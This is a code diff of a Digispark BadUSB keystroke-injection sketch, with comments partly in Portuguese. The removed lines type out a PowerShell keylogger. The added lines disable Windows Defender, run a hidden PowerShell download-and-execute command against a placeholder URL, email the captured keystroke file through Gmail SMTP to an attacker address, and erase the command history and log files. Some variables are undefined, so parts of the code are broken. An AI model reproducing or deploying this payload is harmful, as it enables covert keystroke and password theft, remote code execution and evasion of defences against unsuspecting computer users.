@@ -1,21 +1,90 @@
-#include "DigiKeyboard.h"
-
+#include "DigiKeyboardPtBr.h"
 void setup() {
-  //empty
 }
-void loop() {
-  // Open Powershell
-  DigiKeyboard.sendKeyStroke(0);
-  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
-  DigiKeyboard.delay(500);
-  DigiKeyboard.print("powershell");
-  DigiKeyboard.delay(500);
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(5000);
 
-  // Write Keylogger Function
-  DigiKeyboard.print(F("$code = {function My-Keypresses($Path=\"$env:temp\\mykeypress.txt\") \n{\n  $signatures = @\'\n[DllImport(\"user32.dll\", CharSet=CharSet.Auto, ExactSpelling=true)] \npublic static extern short GetAsyncKeyState(int virtualKeyCode); \n[DllImport(\"user32.dll\", CharSet=CharSet.Auto)]\npublic static extern int GetKeyboardState(byte[] keystate);\n[DllImport(\"user32.dll\", CharSet=CharSet.Auto)]\npublic static extern int MapVirtualKey(uint uCode, int uMapType);\n[DllImport(\"user32.dll\", CharSet=CharSet.Auto)]\npublic static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);\n\'@\n\n  $API = Add-Type -MemberDefinition $signatures -Name \'Win32\' -Namespace API -PassThru\n    \n  $null = New-Item -Path $Path -ItemType File -Force\n\n  try\n  {\n\n    while ($true) {\n      Start-Sleep -Milliseconds 40\n      \n      for ($ascii = 9; $ascii -le 254; $ascii++) {\n        $state = $API::GetAsyncKeyState($ascii)\n\n        if ($state -eq -32767) {\n          $null = [console]::CapsLock\n\n          $virtualKey = $API::MapVirtualKey($ascii, 3)\n\n          $kbstate = New-Object Byte[] 256\n          $checkkbstate = $API::GetKeyboardState($kbstate)\n\n          $mychar = New-Object -TypeName System.Text.StringBuilder\n\n          $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)\n\n          if ($success) \n          {\n            [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode) \n          }\n        }\n      }\n    }\n  }\n  finally\n  {\n  }\n}}; $timeoutSeconds = 10; $j = Start-Job -ScriptBlock $code; if (Wait-Job $j -Timeout $timeoutSeconds) { Receive-Job $j }; Remove-Job -force $j"));
-  DigiKeyboard.delay(500);
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  for(;;){ /*empty*/ }
+void loop() {
+    
+  // Disable Windows Defender
+  DigiKeyboardPtBr.sendKeyStroke(0, MOD_GUI_LEFT);
+  DigiKeyboardPtBr.delay(500);
+  DigiKeyboardPtBr.print("Defender");
+  DigiKeyboardPtBr.delay(500);
+  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
+  DigiKeyboardPtBr.delay(500);
+  DigiKeyboardPtBr.sendKeyStroke(KEY_SPACE);
+  DigiKeyboardPtBr.delay(500);
+  DigiKeyboardPtBr.print("\t\t\t\t\t");
+  DigiKeyboardPtBr.delay(500);
+  DigiKeyboardPtBr.sendKeyStroke(KEY_SPACE);
+  DigiKeyboardPtBr.delay(500);
+  DigiKeyboardPtBr.sendKeyStroke(KEY_SPACE);
+  DigiKeyboardPtBr.delay(500);
+  DigiKeyboardPtBr.print("\t");
+  DigiKeyboardPtBr.delay(500);
+  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
+
+  // Open Powershell
+  DigiKeyboardPtBr.sendKeyStroke(0);
+  DigiKeyboardPtBr.delay(500);
+  DigiKeyboardPtBr.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboardPtBr.delay(500);
+  DigiKeyboardPtBr.println("powershell\ powershell -windowsstyle hidden \"IEX (New-Object Net.WebClient).DownloadString('URL_DO _CODIGO');\"");
+  DigiKeyboardPtBr.delay(3000);
+  
+  // Open Powershell Again
+  DigiKeyboardPtBr.sendKeyStroke(0);
+  DigiKeyboardPtBr.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboardPtBr.delay(500);
+  DigiKeyboardPtBr.println("powershell");
+  DigiKeyboardPtBr.delay(5000);
+
+  // from email address:
+  DigiKeyboardPtBr.print(F("$email = \"EMAIL\";"));
+  // to email address
+  DigiKeyboardPtBr.print(F("$addressee = \"SEU EMAIL\";"));
+  // o lugar onde vai salvar as senhas
+  DigiKeyboardPtBr.print(F("$tempcsv = \"$env:temp\\mykeypress.txt\";"));
+  // senha da sua conta
+  DigiKeyboardPtBr.print(F("$pass = \"SENHA\";"));
+  DigiKeyboardPtBr.print(F("$smtpServer = \"smtp.gmail.com\";"));
+  DigiKeyboardPtBr.print(F("$port = \"587\";"));
+  
+  // send the file to e-mail
+  DigiKeyboardPtBr.print(F("$securestring = $pass | ConvertTo-SecureString -AsPlainText -Force;"));
+  DigiKeyboardPtBr.print(F("$cred = New-Object System.Management.Automation.PSCredential -ArgumentList $email, $securestring;"));
+  DigiKeyboardPtBr.print(F("$msg = new-object Net.Mail.MailMessage;"));
+  DigiKeyboardPtBr.print(F("$smtp = new-object Net.Mail.SmtpClient($smtpServer, $port);"));
+  DigiKeyboardPtBr.print(F("$smtp.EnableSsl = $true;"));
+  DigiKeyboardPtBr.print(F("$msg.From = \"$email\";"));
+  DigiKeyboardPtBr.print(F("$msg.To.Add(\"$addressee\");"));
+  DigiKeyboardPtBr.print(F("$msg.Attachments.Add(\"$tempcsv\");"));
+  DigiKeyboardPtBr.print(F("$msg.BodyEncoding = [system.Text.Encoding]::Unicode;"));
+  DigiKeyboardPtBr.print(F("$msg.SubjectEncoding = [system.Text.Encoding]::Unicode;"));
+  DigiKeyboardPtBr.print(F("$msg.IsBodyHTML = $true ;"));
+  DigiKeyboardPtBr.print(F("$msg.Subject = \"Senhas WIFI\";"));
+  DigiKeyboardPtBr.print(F("$msg.Body = \"<h2> Aqui as suas senhas </h2></br>olha o arquivo...\"; "));
+  DigiKeyboardPtBr.print(F("$SMTP.Credentials = $cred;"));
+  DigiKeyboardPtBr.print(F("$smtp.Send($msg);"));
+  DigiKeyboardPtBr.delay(500);
+  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
+  
+ // clean the logs
+  DigiKeyboardPtBr.delay(500);
+  DigiKeyboardPtBr.println(separator);
+  DigiKeyboardPtBr.delay(500);
+  DigiKeyboardPtBr.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboardPtBr.delay(500);
+  DigiKeyboardPtBr.println(mode);
+  DigiKeyboardPtBr.delay(500);
+  DigiKeyboardPtBr.println(F("del (Get-PSReadlineOption).HistorySavePath;"));
+  DigiKeyboardPtBr.delay(500);
+  DigiKeyboardPtBr.println(F("rm \"$env:temp\\mykeypress.txt\""));
+  DigiKeyboardPtBr.delay(100);
+  DigiKeyboardPtBr.println(separator);
+  DigiKeyboardPtBr.delay(500);
+  DigiKeyboardPtBr.println("exit");
+  DigiKeyboardPtBr.delay(1000);
+  DigiKeyboardPtBr.println("exit");
+
+  for (;;) {}
 }
